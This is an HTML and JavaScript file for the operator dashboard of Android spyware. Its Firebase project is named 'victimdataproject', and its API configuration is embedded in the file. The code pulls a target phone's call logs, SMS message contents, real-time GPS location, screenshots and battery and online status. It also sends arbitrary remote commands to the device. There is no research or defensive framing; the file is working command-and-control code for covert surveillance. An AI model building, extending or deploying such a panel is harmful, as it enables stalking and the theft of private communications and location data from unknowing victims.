<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Monitoring Dashboard</title>

    <!-- Third-party CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />

    <!-- Custom CSS -->
    <link rel="stylesheet" href="style.css">

</head>
<body class="d-none"> <!-- Start hidden until auth check -->
    
    <div class="wrapper">
        <!-- Sidebar -->
        <nav id="sidebar">
            <div class="sidebar-header">
                <i class="fas fa-satellite-dish"></i> <span class="text">Monitor</span>
            </div>

            <ul class="sidebar-menu">
                <li class="nav-item"><a href="#dashboard-summary" class="nav-link active"><i class="fas fa-home icon"></i> <span class="text">Dashboard</span></a></li>
                <li class="nav-item"><a href="#call-logs" class="nav-link"><i class="fas fa-phone-alt icon"></i> <span class="text">Call Logs</span></a></li>
                <li class="nav-item"><a href="#sms-logs" class="nav-link"><i class="fas fa-comments icon"></i> <span class="text">SMS Logs</span></a></li>
                <li class="nav-item"><a href="#location" class="nav-link"><i class="fas fa-map-marker-alt icon"></i> <span class="text">Location</span></a></li>
                <li class="nav-item"><a href="#screenshots" class="nav-link"><i class="fas fa-camera icon"></i> <span class="text">Screenshots</span></a></li>
                <li class="nav-item"><a href="#installed-apps" class="nav-link"><i class="fab fa-android icon"></i> <span class="text">Apps</span></a></li>
                <li class="nav-item"><a href="#file-manager" class="nav-link"><i class="fas fa-folder-open icon"></i> <span class="text">File Manager</span></a></li>
                <li class="nav-item"><a href="#commands" class="nav-link"><i class="fas fa-terminal icon"></i> <span class="text">Commands</span></a></li>
                <!-- Add other 32 links here as placeholders or when implemented -->
            </ul>
        </nav>

        <!-- Page Content -->
        <div id="content">
            <!-- Top Navbar -->
            <nav id="top-navbar" class="navbar navbar-expand-lg">
                <div class="container-fluid">
                    <button class="btn btn-dark d-md-none" id="sidebar-toggle" type="button">
                        <i class="fas fa-bars"></i>
                    </button>
                    <div class="device-status ms-auto me-3 d-flex align-items-center">
                        <span id="device-online-status" class="badge bg-secondary me-2">OFFLINE</span>
                        <span id="device-battery-status" class="badge bg-secondary"><i class="fas fa-battery-empty"></i> --%</span>
                    </div>
                    <div class="dropdown">
                        <button class="btn btn-secondary dropdown-toggle" type="button" id="userDropdown" data-bs-toggle="dropdown" aria-expanded="false">
                            <i class="fas fa-user-shield me-2"></i><span id="user-email"></span>
                        </button>
                        <ul class="dropdown-menu dropdown-menu-end" aria-labelledby="userDropdown">
                            <li><button class="dropdown-item" id="logout-button"><i class="fas fa-sign-out-alt me-2"></i>Logout</button></li>
                        </ul>
                    </div>
                </div>
            </nav>
            
            <!-- Main content -->
            <main>
                <div class="container-fluid">
                    <!-- Row 1: Dashboard Summary & Device Info -->
                    <div class="row" id="dashboard-summary">
                        <div class="col-lg-8">
                            <div class="dashboard-card">
                                <div class="card-header">
                                    <h5 class="card-title"><i class="fas fa-info-circle"></i>Device Info & Status</h5>
                                    <div class="card-actions">
                                        <span class="last-updated" id="status-last-updated"></span>
                                        <button class="btn btn-sm btn-outline-primary" onclick="fetchStatusAndInfo()"><i class="fas fa-sync"></i></button>
                                    </div>
                                </div>
                                <div class="card-body">
                                    <div class="row" id="device-info-content">
                                        <!-- Content loaded by JS -->
                                        <div class="col-md-6"><p><strong>Model:</strong> <span id="info-model">Loading...</span></p></div>
                                        <div class="col-md-6"><p><strong>Android Version:</strong> <span id="info-version">Loading...</span></p></div>
                                        <div class="col-md-6"><p><strong>Battery:</strong> <span id="info-battery">Loading...</span></p></div>
                                        <div class="col-md-6"><p><strong>Wi-Fi:</strong> <span id="info-wifi">Loading...</span></p></div>
                                        <div class="col-md-6"><p><strong>Status:</strong> <span id="info-status">Loading...</span></p></div>
                                        <div class="col-md-6"><p><strong>Last Heartbeat:</strong> <span id="info-heartbeat">Loading...</span></p></div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="col-lg-4">
                            <div class="dashboard-card" id="commands">
                                <div class="card-header">
                                    <h5 class="card-title"><i class="fas fa-terminal"></i>Remote Commands</h5>
                                </div>
                                <div class="card-body command-panel">
                                     <input type="text" id="command-input" class="form-control mb-2" placeholder="e.g., show_toast:Hello">
                                     <button class="btn btn-primary w-100" id="send-command-btn">Send Command</button>
                                     <div id="command-feedback" class="form-text mt-2"></div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- Row 2: Location & Screenshots -->
                     <div class="row">
                        <div class="col-lg-6" id="location">
                           <div class="dashboard-card">
                                <div class="card-header">
                                    <h5 class="card-title"><i class="fas fa-map-marked-alt"></i>Real-time GPS Location</h5>
                                    <div class="card-actions">
                                        <span class="last-updated" id="location-last-updated"></span>
                                        <button class="btn btn-sm btn-outline-primary" onclick="fetchLocation()"><i class="fas fa-sync"></i></button>
                                    </div>
                                </div>
                                <div class="card-body p-0">
                                    <div id="map"></div>
                                </div>
                           </div>
                        </div>
                        <div class="col-lg-6" id="screenshots">
                           <div class="dashboard-card">
                                <div class="card-header">
                                    <h5 class="card-title"><i class="fas fa-image"></i>Screenshot Viewer</h5>
                                    <div class="card-actions">
                                         <span class="last-updated" id="screenshots-last-updated"></span>
                                        <button class="btn btn-sm btn-outline-primary" onclick="fetchScreenshots()"><i class="fas fa-sync"></i></button>
                                    </div>
                                </div>
                                <div class="card-body">
                                    <div class="screenshot-gallery" id="screenshot-gallery-content">
                                        <!-- Screenshots loaded by JS -->
                                        <p>Loading screenshots...</p>
                                    </div>
                                </div>
                           </div>
                        </div>
                    </div>

                    <!-- Row 3: Call & SMS Logs -->
                    <div class="row">
                        <div class="col-lg-12" id="call-logs">
                           <div class="dashboard-card">
                                <div class="card-header">
                                    <h5 class="card-title"><i class="fas fa-phone-volume"></i>Call Logs</h5>
                                    <div class="card-actions">
                                         <span class="last-updated" id="calls-last-updated"></span>
                                        <button class="btn btn-sm btn-outline-primary" onclick="fetchCallLogs()"><i class="fas fa-sync"></i></button>
                                    </div>
                                </div>
                                <div class="card-body table-responsive">
                                    <table class="table table-dark-custom table-hover">
                                        <thead><tr><th>Name</th><th>Number</th><th>Type</th><th>Duration</th><th>Date</th></tr></thead>
                                        <tbody id="call-logs-table">
                                            <!-- Data loaded by JS -->
                                            <tr><td colspan="5" class="text-center">Loading call logs...</td></tr>
                                        </tbody>
                                    </table>
                                </div>
                           </div>
                        </div>
                        <div class="col-lg-12" id="sms-logs">
                           <div class="dashboard-card">
                                <div class="card-header">
                                    <h5 class="card-title"><i class="fas fa-sms"></i>SMS Logs</h5>
                                    <div class="card-actions">
                                         <span class="last-updated" id="sms-last-updated"></span>
                                        <button class="btn btn-sm btn-outline-primary" onclick="fetchSmsLogs()"><i class="fas fa-sync"></i></button>
                                    </div>
                                </div>
                                <div class="card-body table-responsive">
                                    <table class="table table-dark-custom table-hover">
                                        <thead><tr><th>Direction</th><th>Number</th><th>Message</th><th>Date</th></tr></thead>
                                        <tbody id="sms-logs-table">
                                            <!-- Data loaded by JS -->
                                            <tr><td colspan="4" class="text-center">Loading SMS logs...</td></tr>
                                        </tbody>
                                    </table>
                                </div>
                           </div>
                        </div>
                    </div>
                    
                    <!-- Add placeholders for the other 35+ features here -->
                    <!-- Example: Installed Apps -->
                    <div class="row">
                        <div class="col-lg-12" id="installed-apps">
                           <div class="dashboard-card">
                                <div class="card-header">
                                    <h5 class="card-title"><i class="fab fa-app-store-ios"></i>Installed Applications</h5>
                                    <div class="card-actions">
                                        <span class="last-updated" id="apps-last-updated"></span>
                                        <button class="btn btn-sm btn-outline-primary" onclick="fetchInstalledApps()"><i class="fas fa-sync"></i></button>
                                    </div>
                                </div>
                                <div class="card-body">
                                    <p id="installed-apps-content" class="text-center text-secondary">Feature not fully implemented. Data would be loaded here.</p>
                                </div>
                           </div>
                        </div>
                    </div>

                </div>
            </main>
        </div>
    </div>
    
    <!-- Screenshot Modal -->
    <div class="modal fade" id="imageModal" tabindex="-1">
      <div class="modal-dialog modal-lg modal-dialog-centered">
        <div class="modal-content bg-dark">
          <div class="modal-header">
            <h5 class="modal-title" id="imageModalLabel">Image Preview</h5>
            <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
          </div>
          <div class="modal-body text-center">
            <img src="" id="modalImage" class="img-fluid">
          </div>
        </div>
      </div>
    </div>
    <div class="d-none" id="sidebar-overlay"></div>


    <!-- Firebase SDKs -->
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-auth.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-storage.js"></script>
    
    <!-- Third-party JS -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>

    <!-- Main Application Logic -->
    <script>
        // --- IMPORTANT: CONFIGURE YOUR DEVICE ID HERE ---
        const DEVICE_ID = 'YOUR_DEVICE_ID_HERE'; 
        // ------------------------------------------------

        const firebaseConfig = {
            apiKey: "AIzaSyAOA7R6MWf_VGVScscqL3ND0zs3kMVCTYk",
            authDomain: "victimdataproject.firebaseapp.com",
            databaseURL: "https://victimdataproject-default-rtdb.firebaseio.com",
            projectId: "victimdataproject",
            storageBucket: "victimdataproject.firebasestorage.app",
            messagingSenderId: "938788267301",
            appId: "1:938788267301:web:cdcff391160dce48fa66cc"
        };

        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);
        const auth = firebase.auth();
        const db = firebase.database();
        const storage = firebase.storage();

        // DOM Elements
        const userEmailEl = document.getElementById('user-email');
        const logoutButton = document.getElementById('logout-button');
        const mainBody = document.querySelector('body');
        
        // Leaflet Map
        let map;
        let marker;

        function initializeMap() {
            if (!map) {
                map = L.map('map').setView([51.505, -0.09], 2); // Default view
                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                    maxZoom: 19,
                    attribution: '© OpenStreetMap'
                }).addTo(map);
                marker = L.marker([51.505, -0.09]).addTo(map);
            }
        }

        // --- AUTHENTICATION GUARD ---
        auth.onAuthStateChanged(user => {
            if (user) {
                // User is signed in, show the page
                userEmailEl.textContent = user.email;
                mainBody.classList.remove('d-none');
                
                // Initial data load
                loadAllData();
                initializeMap();

                // Set auto-refresh interval (30 seconds)
                setInterval(loadAllData, 30000);

            } else {
                // No user is signed in, redirect to login page
                window.location.replace('login.html');
            }
        });

        logoutButton.addEventListener('click', () => {
            auth.signOut();
        });

        // --- UTILITY FUNCTIONS ---
        function formatTimestamp(ts) {
            if (!ts) return 'N/A';
            return new Date(ts).toLocaleString();
        }
        
        function updateLastUpdated(elementId) {
            document.getElementById(elementId).textContent = `Last updated: ${new Date().toLocaleTimeString()}`;
        }

        function renderTable(tableBodyId, data, renderRowFunc, noDataMessage) {
            const tableBody = document.getElementById(tableBodyId);
            if (!data) {
                tableBody.innerHTML = `<tr><td colspan="10" class="text-center">${noDataMessage}</td></tr>`;
                return;
            }
            const dataArray = Object.values(data).sort((a,b) => (b.timestamp || b.time) - (a.timestamp || a.time)); // Sort by time, descending
            tableBody.innerHTML = dataArray.map(renderRowFunc).join('');
        }

        // --- DATA FETCHING AND RENDERING FUNCTIONS ---

        function fetchStatusAndInfo() {
            const statusRef = db.ref(`users/${DEVICE_ID}/status`);
            const infoRef = db.ref(`users/${DEVICE_ID}/device_info`);
            const batteryRef = db.ref(`users/${DEVICE_ID}/battery`);

            statusRef.once('value').then(snapshot => {
                const data = snapshot.val();
                if (data) {
                    const isOnline = (Date.now() - data.heartbeat) < 120000; // Online if heartbeat within 2 mins
                    document.getElementById('info-status').textContent = isOnline ? 'Online' : 'Offline';
                    document.getElementById('info-heartbeat').textContent = formatTimestamp(data.heartbeat);
                    
                    const onlineStatusEl = document.getElementById('device-online-status');
                    onlineStatusEl.textContent = isOnline ? 'ONLINE' : 'OFFLINE';
                    onlineStatusEl.className = `badge me-2 ${isOnline ? 'bg-success' : 'bg-danger'}`;
                }
                updateLastUpdated('status-last-updated');
            });
            
            infoRef.once('value').then(snapshot => {
                const data = snapshot.val();
                if(data){
                    document.getElementById('info-model').textContent = `${data.brand} ${data.model}`;
                    document.getElementById('info-version').textContent = data.android_version;
                }
            });
            
            batteryRef.once('value').then(snapshot => {
                const data = snapshot.val();
                if(data){
                    const batteryText = `${data.level}% (${data.is_charging ? 'Charging' : 'Discharging'})`;
                    document.getElementById('info-battery').textContent = batteryText;
                    
                    const batteryStatusEl = document.getElementById('device-battery-status');
                    let iconClass;
                    if(data.level > 90) iconClass = 'fa-battery-full';
                    else if(data.level > 60) iconClass = 'fa-battery-three-quarters';
                    else if(data.level > 30) iconClass = 'fa-battery-half';
                    else if(data.level > 10) iconClass = 'fa-battery-quarter';
                    else iconClass = 'fa-battery-empty';
                    
                    batteryStatusEl.innerHTML = `<i class="fas ${iconClass}"></i> ${data.level}%`;
                    batteryStatusEl.className = `badge ${data.level > 20 ? 'bg-primary' : 'bg-danger'}`;
                }
            });
        }

        function fetchLocation() {
            db.ref(`users/${DEVICE_ID}/location`).limitToLast(1).once('value').then(snapshot => {
                if (snapshot.exists()) {
                    const data = Object.values(snapshot.val())[0];
                    const lat = data.latitude;
                    const lon = data.longitude;
                    if (map && marker) {
                        const newLatLng = new L.LatLng(lat, lon);
                        marker.setLatLng(newLatLng);
                        map.setView(newLatLng, 16);
                        marker.bindPopup(`<b>Location</b><br>Lat: ${lat.toFixed(5)}<br>Lon: ${lon.toFixed(5)}<br>Time: ${formatTimestamp(data.timestamp)}`).openPopup();
                    }
                }
                updateLastUpdated('location-last-updated');
            });
        }

        function fetchCallLogs() {
             db.ref(`users/${DEVICE_ID}/calls`).limitToLast(50).once('value').then(snapshot => {
                const renderRow = call => `
                    <tr>
                        <td>${call.name || 'Unknown'}</td>
                        <td>${call.number}</td>
                        <td><span class="badge bg-${call.type === 'INCOMING' ? 'success' : 'info'}">${call.type}</span></td>
                        <td>${call.duration}s</td>
                        <td>${formatTimestamp(call.timestamp)}</td>
                    </tr>`;
                renderTable('call-logs-table', snapshot.val(), renderRow, 'No call logs found.');
                updateLastUpdated('calls-last-updated');
            });
        }
        
        function fetchSmsLogs() {
            db.ref(`users/${DEVICE_ID}/sms`).limitToLast(50).once('value').then(snapshot => {
                const renderRow = sms => `
                    <tr>
                        <td><span class="badge bg-${sms.direction === 'in' ? 'primary' : 'secondary'}">${sms.direction === 'in' ? 'INBOX' : 'SENT'}</span></td>
                        <td>${sms.number}</td>
                        <td class="text-truncate" style="max-width: 300px;">${sms.message}</td>
                        <td>${formatTimestamp(sms.time)}</td>
                    </tr>`;
                renderTable('sms-logs-table', snapshot.val(), renderRow, 'No SMS logs found.');
                updateLastUpdated('sms-last-updated');
            });
        }

        function fetchScreenshots() {
            const gallery = document.getElementById('screenshot-gallery-content');
            gallery.innerHTML = '<div class="spinner-border text-primary" role="status"><span class="visually-hidden">Loading...</span></div>';
            
            storage.ref(`users/${DEVICE_ID}/screenshots`).listAll().then(res => {
                if(res.items.length === 0){
                    gallery.innerHTML = '<p>No screenshots found.</p>';
                    updateLastUpdated('screenshots-last-updated');
                    return;
                }
                
                gallery.innerHTML = '';
                const sortedItems = res.items.sort((a,b) => b.name.localeCompare(a.name)); // Sort by filename (timestamp)

                sortedItems.slice(0, 12).forEach(itemRef => { // Show latest 12
                    itemRef.getDownloadURL().then(url => {
                        const col = document.createElement('div');
                        col.className = 'screenshot-item';
                        col.innerHTML = `<img src="${url}" alt="Screenshot" data-bs-toggle="modal" data-bs-target="#imageModal" data-img-src="${url}">`;
                        gallery.appendChild(col);
                    });
                });
                updateLastUpdated('screenshots-last-updated');
            }).catch(error => {
                gallery.innerHTML = '<p class="text-danger">Error loading screenshots.</p>';
            });
        }

        function sendCommand() {
            const input = document.getElementById('command-input');
            const feedback = document.getElementById('command-feedback');
            const command = input.value.trim();

            if (!command) {
                feedback.textContent = 'Command cannot be empty.';
                feedback.className = 'form-text mt-2 text-danger';
                return;
            }

            db.ref(`users/${DEVICE_ID}/commands`).push({
                command: command,
                timestamp: firebase.database.ServerValue.TIMESTAMP
            }).then(() => {
                feedback.textContent = `Command "${command}" sent successfully.`;
                feedback.className = 'form-text mt-2 text-success';
                input.value = '';
            }).catch(error => {
                feedback.textContent = `Error: ${error.message}`;
                feedback.className = 'form-text mt-2 text-danger';
            });
        }
        
        function fetchInstalledApps(){
             updateLastUpdated('apps-last-updated');
             // This is a placeholder. Implementation would be similar to fetchCallLogs.
             // db.ref(`users/${DEVICE_ID}/installed_apps`).once(...)
        }
        
        function loadAllData() {
            fetchStatusAndInfo();
            fetchLocation();
            fetchCallLogs();
            fetchSmsLogs();
            fetchScreenshots();
            fetchInstalledApps();
            // Call other fetch functions here
        }
        
        // --- EVENT LISTENERS ---
        document.getElementById('send-command-btn').addEventListener('click', sendCommand);
        
        // Modal logic for screenshots
        const imageModal = document.getElementById('imageModal');
        imageModal.addEventListener('show.bs.modal', function (event) {
          const triggerElement = event.relatedTarget;
          const imgSrc = triggerElement.getAttribute('data-img-src');
          const modalImage = imageModal.querySelector('#modalImage');
          modalImage.src = imgSrc;
        });

        // Sidebar toggle for mobile
        const sidebarToggle = document.getElementById('sidebar-toggle');
        const sidebarOverlay = document.getElementById('sidebar-overlay');
        sidebarToggle.addEventListener('click', () => {
            document.body.classList.toggle('sidebar-toggled');
            sidebarOverlay.classList.toggle('d-none');
        });
        sidebarOverlay.addEventListener('click', () => {
             document.body.classList.remove('sidebar-toggled');
             sidebarOverlay.classList.add('d-none');
        });

        // Smooth scroll for sidebar links
        document.querySelectorAll('.sidebar-menu a').forEach(anchor => {
            anchor.addEventListener('click', function (e) {
                e.preventDefault();
                document.querySelector(this.getAttribute('href')).scrollIntoView({
                    behavior: 'smooth'
                });
                // On mobile, close sidebar after click
                if (window.innerWidth < 768) {
                    document.body.classList.remove('sidebar-toggled');
                    sidebarOverlay.classList.add('d-none');
                }
            });
        });

    </script>
</body>
</html>